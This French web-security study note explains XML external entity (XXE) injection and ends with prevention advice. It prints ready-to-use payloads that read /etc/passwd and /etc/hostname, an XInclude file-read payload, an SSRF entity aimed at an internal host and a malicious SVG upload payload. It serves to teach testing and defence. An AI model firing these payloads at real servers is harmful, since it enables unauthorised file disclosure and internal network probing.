---
title: "11.Injection d'entité externe XML (XXE)"
category: "Serveur"
tag: "Web"
---
## CheckList en pratique
- Exploitation de XXE pour récupérer des fichiers :
    >Penser à changer le nom du fichier en fonction du système d'exploitation que l'on vise.
    - Contenu du xml accessible  

    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
    <stockCheck><productId>&xxe;</productId></stockCheck>
    ```
    - Contenu xml inaccessible : on vérifie les champs (et le retour de requête)    

    ```xml
    <foo xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include parse="text" href="file:///etc/passwd"/></foo>
    ```
- Exploitation de XXE pour effectuer du SSRF : idem mais avec une requête http.

    ```xml
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
    ```
- Attaques XXE par upload de fichiers : soumettre des fichiers basés sur du xml : `DOCX`, `SVG`, `ODT`, `ODS`, `ODP`, `XLSX`, `PPTX`, `EPUB`, `FB2`, `DOCBOOK`, `XHTML`, ...

    ```html
    <?xml version="1.0" standalone="yes"?>
    <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
    <svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
    <text font-size="16" x="0" y="16">&xxe;</text>
    </svg>
    ```
- Attaques XXE par modification de content-type.
    Regarder les formulaire sous formes de requêtes `POST` de l'application à la recherche d'un 
    Content-Type: `application/x-www-form-urlencoded`. Le remplacer par `text/xml` et insérer du xml standard (`<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>`) dans le body pour voir si l'application le parse. Si c'est le cas, tenter l'exploitation.

## Explication de la vulnérabilité  

L'injection d'entité externe XML **(XXE)** est une vulnérabilité qui permet à un attaquant d'interférer avec le traitement des données XML par une application.  
Cela permet souvent à un attaquant d'afficher des fichiers sur le système de fichiers du serveur d'applications et d'intéragir avec tous les systèmes back-end ou externes auxquels l'application elle-même peut accéder.

Dans certains cas, une xxe peut permettre à un attaquant de compromettre un serveur en effectuant des SSRF.

## Comment surviennent les vulnérabilités XXE ?
Certaines applications utilisent du format XML pour faire transiter des données entre le navigateur et le serveur. Ces applications utilisent des librairies standards ou une API pour traiter les données XML sur le serveur.

Les xxe surviennent car les spécifications XML contiennent diverses fonctionnalités potentiellement dangereuses.


Faisons un bref rappel des notions autour de XML et des entités XML.

### Qu'est ce que XML?
XML (extensible markup langage) est un langage conçu pour stocker et transférer des données. Il utilise une structure arborescente de balises et de données.   
Les balises ne sont pas prédéfinis (on peut leur attribuer un nom qui correspond à la donnée).

### Que sont les entités XML?
Les entités XML sont un moyen de représenter un élément de données dans un document XML, au lieu d'utiliser les données elles-mêmes.  
Par exemple, les entités `&lt;` et `&gt;` représentent les caractères `<` et `>`. Ce sont des métacaractères utilisés pour désigner les balises XML et doivent donc généralement être représentés à l'aide de leurs entités lorsqu'elles apparaissent dans les données.

### Qu’est-ce que la définition du type de document ?
La définition de type de document XML **(DTD)** contient des déclarations qui peuvent définir la structure d'un document XML, les types de valeurs de données qu'il peut contenir et d'autres éléments.

Le DTD est déclaré dans l'élément facultatif `DOCTYPE` au début du document XML. Le DTD peut être dans le document lui-même (interne) ou chargée depuis un autre endroit (externe) ou peut être un hybride des deux.

Un exemple de document XML :
```html
<?xml version="1.0"?>
<!DOCTYPE encyclopedie SYSTEM "encyclopedie.dtd">
<encyclopedie>...</encyclopedie>
```

Avec le DTD associé (encyclopedie.dtd):

```html
<?xml version="1.0"?>
<!ELEMENT encyclopedie     (personne*)>
<!ELEMENT personne  (nom,prenom,publication+)>
<!ATTLIST personne sexe (H | F) "H">
<!ELEMENT nom       (#PCDATA)>
<!ELEMENT prenom    (#PCDATA)>
<!ELEMENT publication (#PCDATA)>
```

### Que sont les entités XML personnalisées ?
XML permet de définir des entités personnalisées dans la DTD.  
Par exemple:
`<!DOCTYPE foo [ <!ENTITY myentity "my entity value" > ]>`

Cette définition signifie que toute utilisation de la référence d'entité `&myentity;` dans le document XML sera remplacée par la valeur définie : "ma valeur d'entité".

### Que sont les entités externes XML ?

Les entités externes XML sont un type d'entité personnalisée dont la définition se situe en dehors de la DTD où elles sont déclarées.

La déclaration d'une entité externe utilise le mot-clé `SYSTEM` et doit spécifier une URL à partir de laquelle la valeur de l'entité doit être chargée.  
Par exemple:
`<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]>`


L'URL peut utiliser le protocole `file://`, ainsi des entités externes peuvent être chargées à partir du fichier.  
Par exemple:
`<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>`


## Quels sont les types d’attaques XXE ?

- `Exploitation de XXE pour récupérer des fichiers`, où une entité externe est définie contenant le contenu d'un fichier et renvoyée dans la réponse de l'application.
- `Exploiter XXE pour effectuer des attaques SSRF`, où une entité externe est définie en fonction d'une URL vers un système back-end.
- `Exploiter Blind-XXE pour exfiltre les données hors bande`, où les données sensibles sont transmises du serveur d'applications à un système contrôlé par l'attaquant.
- `Exploiter Blind-XXE pour récupérer des données via des messages d'erreur`, où l'attaquant peut déclencher un message d'erreur d'analyse contenant des données sensibles.

## Exploitation de XXE pour récupérer des fichiers
Pour effectuer une attaque par injection XXE qui récupère un fichier du système de fichiers du serveur, On peut modifier le XML soumis de 2 manières :
- Introduire (ou modifier) un élément `DOCTYPE` qui définit une entité externe contenant le chemin d'accès au fichier.
- Modifier une donnée dans le XML qui est renvoyé dans la réponse de l'application, pour utiliser l'entité externe définie.

Par exemple, supposons qu'une application d'achat vérifie le niveau des stocks d'un produit en soumettant le code XML suivant au serveur :
```html
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId></stockCheck>
```

L'application n'effectue aucune défense particulière contre les attaques XXE, On peut donc exploiter la vulnérabilité XXE pour récupérer le fichier `/etc/passwd ` :

```html
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```
> Penser à tester tous les champs d'un document xml pour une éventuelle xxe.

## Exploiter XXE pour effectuer des attaques SSRF
Outre la récupération de données sensibles, l'autre impact principal des attaques XXE est qu'elles peuvent être utilisées pour effectuer des `SSRF`.
Il s'agit d'une vulnérabilité dans laquelle l'application backend peut être amenée à effectuer des `requêtes HTTP` vers n'importe quelle URL à laquelle le serveur peut accéder.  

Pour **exploiter** une vulnérabilité XXE afin d'effectuer un `SSRF`, il faut définir une entité XML externe à l'aide de l'URL cible et utiliser <u>l'entité définie dans une valeur de données.</u>


Si on peut utiliser l'entité définie dans une valeur de donnée, et que celle-ci est renvoyé dans la réponse de la requête, alors on peut voir la réponse de l'URL fournit à l'entité et on a une intéraction bidirectionnel.

Dans le cas où on ne peut pas voir la réponse, on pourra seulement effectuer des attaques `Blind SSRF`.

> La différence par rapport à la partie précédente est qu'on va essayer de faire exécuter des requêtes (par exemples HTTP), à la machine plutôt que d'afficher un fichier local. On peut imaginer de faire une bruteforce sur les adresses IP privées classiques pour voir s'il existe une @IP qui réagit.


## Blind-XXE : A faire une fois la version PRO de BURP acquise

Une Blind-XXE consiste en une vulnérabilité `XXE`, à la différence que l'application ne renvoie les valeurs d'aucune entité externe définie dans ses réponses et que la récupération directe des fichiers côté serveur n'est donc pas possible.

## Trouver une surface d'attaque cachée pour l'injection XXE
Les attaques xxe sont faciles lorsqu'une application inclus dans la requête des données sous format XML. Dans d'autres cas, la surface d'attaques est moins visible mais en regardant au bon endroit, il est possible de trouver des attaques xxe.

### Attaques XInclude
Certaines applications reçoivent des données soumises par le client, les intègrent côté serveur dans un document XML, puis analysent le document.

>Un exemple de ça se produit lorsque des données soumises par un client sont placées dans une requête SOAP, qui est traitée par le service SOAP backend.

Dans cette situation, une attaque xxe classique n'est pas possible car on ne contrôle pas l'intégralité du document XML, et donc on ne peut définir un element `DOCTYPE`.
Cependant, on peut utiliser `XInclude`à la place.

`XInclude` fait partie de la spécification XML qui permet de créer un document XML à partir de `sous-documents`.
On peut faire une attaque XInclude à partir de n'importe quellles valeurs de données d'un document XML, donc l'attaque peut être faite à partir du moment où l'on contrôle un seul champ xml.

Pour exécuter une attaque `XInclude`, il faut référencer le namespace `XInclude` et fournir le **path** du fichier à include.
```html
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

### Attaques XXE par upload de fichiers
Certaines applications permettent aux utilisateurs d'upload des fichiers qui sont ensuite traités côté serveur. 
- Certains formats de fichiers courants utilisent XML ou contiennent des sous-composants XML. Des exemples de formats basés sur XML sont les formats de documents bureautiques comme **`DOCX`** et les formats d'image comme `SVG`.
- Autre exemple : lorsqu'une application autorise les images à être upload comme les formats **PNG**, **JPEG** ou **SVG**, et qu'elle les valide après qu'ils soient upload.
Même si l'applications s'attends à du PNG ou JPEG, **la bibliothèque de traitement d'images** utilisée peut prendre en charge les images `SVG`.
>Étant donné que le format SVG utilise XML, un attaquant peut soumettre une image SVG malveillante et ainsi atteindre la surface d'attaque cachée pour les vulnérabilités XXE.

<u>Exemple de payload d'image svg :</u>
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
<text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

### Attaques XXE par modification de content-type

La plupart des requêtes `POST` utilisent un type de contenu par défaut **généré par les formulaires HTML**, tel que `application/x-www-form-urlencoded`.
Certains sites Web s'attendent à recevoir des requêtes dans ce format mais tolèrent d'autres types de contenu, notamment XML.

Par exemple, si une requête normale contient les éléments suivants :

```http
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```

La requête suivante pourra être soumise, avec le même résultat :
```http
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```

Si l'application tolère les requêtes contenant du XML dans `le body du message `et analyse le contenu du corps en tant que XML, on peut donc atteindre la surface d'attaque cachée XXE en r`eformatant simplement les requêtes pour utiliser le format XML.`

## Comment trouver et tester les vulnérabilités XXE

- De manière automatisée :
    Utiliser le scanner de vulnérabilités Web de **Burp** ==> version pro
- De manière manuelle : 
    - Test de [récupération de fichiers](http://mis0ko.github.io/serveur/xxe/#exploitation-de-xxe-pour-récupérer-des-fichiers) en définissant une entité externe basée sur un fichier du système d'exploitation bien connu et en utilisant cette entité dans les données renvoyées dans la réponse de l'application.
    - Test des vulnérabilités  Blind-XXE en définissant une entité externe basée sur une URL vers un système que vous contrôlez et en surveillant les interactions avec ce système. Burp Collaborator est parfait à cet effet.
    - Test de l'inclusion vulnérable de données non XML fournies par l'utilisateur dans un document XML côté serveur en utilisant une attaque XInclude pour tenter de récupérer un fichier de système d'exploitation bien connu.

## Comment prévenir les vulnérabilités XXE

Pratiquement toutes les vulnérabilités XXE surviennent parce que la bibliothèque d'analyse XML de l'application prend en charge des fonctionnalités XML potentiellement dangereuses dont l'application n'a pas besoin ou n'a pas l'intention d'utiliser. Le moyen le plus simple et le plus efficace de prévenir les attaques XXE consiste à désactiver ces fonctionnalités.

Généralement, il suffit de désactiver la résolution des entités externes et de désactiver la prise en charge de XInclude. Cela peut généralement être fait via les options de configuration ou en remplaçant par programme le comportement par défaut. Consultez la documentation de votre bibliothèque d'analyse XML ou de votre API pour plus de détails sur la façon de désactiver les fonctionnalités inutiles. 